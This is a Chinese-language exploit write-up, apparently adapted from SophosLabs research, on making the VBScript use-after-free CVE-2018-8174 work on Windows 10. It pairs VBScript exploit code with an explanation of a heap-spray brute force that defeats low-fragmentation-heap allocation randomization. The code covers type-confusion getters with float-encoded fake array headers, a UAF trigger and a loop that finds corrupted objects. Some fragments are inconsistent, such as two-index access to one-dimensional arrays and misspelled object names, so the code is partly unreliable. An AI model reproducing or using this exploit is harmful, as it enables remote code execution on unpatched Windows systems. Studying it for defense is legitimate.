### 代码优化

```vbscript
Dim UafArrayA(6), UafArrayB(6)
Dim UafCounter

' Public Default Property Get Q
Public Default Property Get Q()
    Dim objectImitatingArray
    Q = CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
    For idx = 0 To 6
        On Error Resume Next
        Set m = RS(idx).NextRecordset(resueObjectA_arr)
    Next
    Set objectImitatingArray = New FakeReuseClass
    objectImitatingArray.mem = FakeArrayString
End Property

' Public Default Property Get P
Public Default Property Get P()
    Dim objectImitatingInteger
    P = CDbl("636598737289582e-328") ' db 0, 0, 0, 0, 3, 0, 0, 0
    For idx = 0 To 6
        On Error Resume Next
        Set m = RS(7 + idx).NextRecordset(resueObjectB_int)
    Next
    Set objectImitatingInteger = New FakeReuseClass
    objectImitatingInteger.mem = Empty16BString
End Property

Sub UafTrigger
    Dim objectArray(38)
    For idx = 20 To 38
        Set objectArray(idx) = New ReuseClass
    Next
    Set resueObjectA_arr = New ReuseClass
    Set resueObjectB_int = New ReuseClass
End Sub
```

### 漏洞分析与绕过低碎片堆分配顺序随机化

**漏洞适用性**
该漏洞适用于运行Windows 7的系统，但不适用于Windows 8或更高版本。原始捕获的漏洞利用也是如此。漏洞利用由于“低碎片堆(LFH)分配顺序随机化”而中断，这是Windows 8中引入的堆的安全措施，它阻断了简单的use-after-free漏洞利用方案。

**绕过低碎片堆分配顺序随机化**

Microsoft在引入LFH分配顺序随机化后，改变了堆的行为。例如，malloc-> free-> malloc执行的结果从遵循LIFO（后进先出）逻辑转变为不确定性。这破坏了原有的漏洞利用，因为无法假设新对象会被分配到刚释放的内存位置。

在VBScript中，所有自定义类对象都由`VBScriptClass` C++类内部表示。当创建新的自定义类对象时，会分配0x44字节的内存来保存`VBScriptClass`对象。如果一个对象被销毁后立即创建一个新的对象，类型混淆攻击依赖于新对象使用相同的内存地址。然而，在启用了分配顺序随机化的情况下，这种假设不再成立。

**类型混淆攻击**

成功的类型混淆攻击需要满足以下条件：如果在`reuseObjectA_arr`销毁后，一个新的VBScript对象接收到与之前`reuseObjectA_arr`相同的0x108字节大小的分配地址，则攻击成功。与两个对象绑定的其他分配（包括0x44字节大小的顶级分配），不一定要获得匹配的地址。

**内存损坏细节**

`ReuseClass`的方法`SetProp`具有以下语句：`mem = Value`。`Value`是一个对象变量，因此在完成赋值之前必须调用其默认属性getter。VBS脚本引擎调用内部函数`AssignVar`来执行此类赋值。这是一个简化的伪代码：

```vbscript
AssignVar(VARIANT *destinationObject, char *destinationVariableName, VARIANT *source) {
    VARIANT *destinationPointer = CScriptRuntime::GetVarAdr(destinationObject, destinationVariableName);
    if (source->vt == VT_IDISPATCH) {
        VARIANT *sourceValue = VAR::InvokeByDispID(source);
    }
    *destinationPointer = *sourceValue;
}
```

`VAR::InvokeByDispID`调用源对象的默认属性getter，允许我们在`AssignVar`执行过程中运行任意的VBScript代码。如果我们使用该空间来触发`destinationObject`内存中的销毁和替换，就可以利用`AssignVar`继续执行到`destinationPointer`的赋值，而不会察觉到其指向的内存可能已经被篡改。

**CVE-2018-8174漏洞利用**

为了使这种漏洞利用在Windows 10系统上有效，我们可以实现一种暴力的方法来尝试类型混淆攻击。通过批量创建新对象，可以确保释放的0x108空间最终被分配到其中一个对象中。

下面是将代码转换为通过暴力实现的方法：

```vbscript
Set reuseObjectA_arr = New ReuseClass
...
Class ReplacingClass_Array
    Public Default Property Get Q
        Dim objectImitatingArray
        Q = CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
        For i = 0 To 6
            DecrementRefcount(reuseObjectA_arr)
        Next
        For i = 0 To UBound(UafArrayA)
            Set objectImitatingArray = New FakeReuseClass
            objectImitatingArray.mem = FakeArrayString
            For j = 0 To 6
                Set UafArrayA(i, j) = objectImitatingArray
            Next
        Next
    End Property
End Class
```

**查找被损坏的对象**

```vbscript
For i = 0 To UBound(UafArrayA)
    Err.Clear
    a = UafArrayA(i, 0).mem(Empty16BString_addr)
    If Err.Number = 0 Then
        Exit For
    End If
Next
If i > UBound(UafArrayA) Then
    MsgBox "Could not find an object corrupted by reuseObjectA_arr"
Else
    MsgBox "Got UafArrayA_obj from UafArrayA(" & i & ")"
    Set UafArrayA_obj = UafArrayA(i, 0)
End If
```

通过对原始漏洞利用过程的修正，它现在也可以在Windows 10系统上有效运行。

**PoC**

可以在[SophosLabs GitHub repository](https://github.com/sophoslabs/CVE-2019-0888)找到PoC。